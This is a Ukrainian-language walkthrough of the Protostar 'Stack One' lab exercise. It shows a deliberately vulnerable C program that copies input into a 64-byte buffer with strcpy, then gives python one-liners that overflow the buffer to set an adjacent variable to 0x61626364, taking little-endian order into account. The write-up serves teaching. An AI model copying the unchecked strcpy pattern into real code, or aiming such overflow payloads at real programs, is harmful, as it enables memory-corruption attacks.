## [Stack One](http://exploit.education/protostar/stack-one/)

На даному рівні розглядається концепція модифікації змінних до певних значень у програмі та спосіб розміщення змінних у пам’яті.

Переходимо у директорію із завданням:  
```cd /opt/protostar/bin/```

Вихідний код:  
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Код схожий до попереднього рівня. У нас досі є ```volatile``` і буфер на 64 байти. Але замість ```gets()``` використовується ```strcpy()```. 
Дана функція приймає два аргументи: ```destination``` і ```source```. Вона копіює дані із рядка, на який вказує аргумент ```source```, у рядок, на який вказує аргумент ```destination```, 
поки не зустрінеться символ кінця рядка. Копіювання відбувається разом із символом кінця рядка. Якщо рядки перекриваються, то результат копіювання буде невизначений.  
Ще однією відмінністю від попереднього рівня є те, що змінна ```modified``` повинна дорівнювати ```0x61626364```.  

Спробуємо запусти код із попереднього рівня для перевірки результату. Тільки цього разу потрібно скористатися BASH для підстановки значення, щоб використовувати наш вивід у якості аргументу:  
```./stack1 $(python -c "print 'a' * 65")```

У результаті буде отримано: "Try again, you got 0x00000061". Якщо подивитися у таблицю ASCII-символів, то символ 'a' якраз має значення 0x00000061 у шістнадцятковій системі. 
До речі, ```0x61626364``` очевидно буде 'abcd'. Отже, можна просто ввести 64 символи у буфер, а останніми задати 'abcd'. 
Але насправді тут є один нюанс під назвою little endian (числа у пам'яті перевернуті). Отже, потрібно зробити реверс рядка. Маємо наступну команду:  
```./stack1 $(python -c "print('a' * 64 + 'abcd'[::-1])")```

Ну або більш універсальний спосіб (щоб не вгадувати коди необхідних символів):  
```./stack1 $(python -c "print('a' * 64 + '\x61\x62\x63\x64'[::-1])")```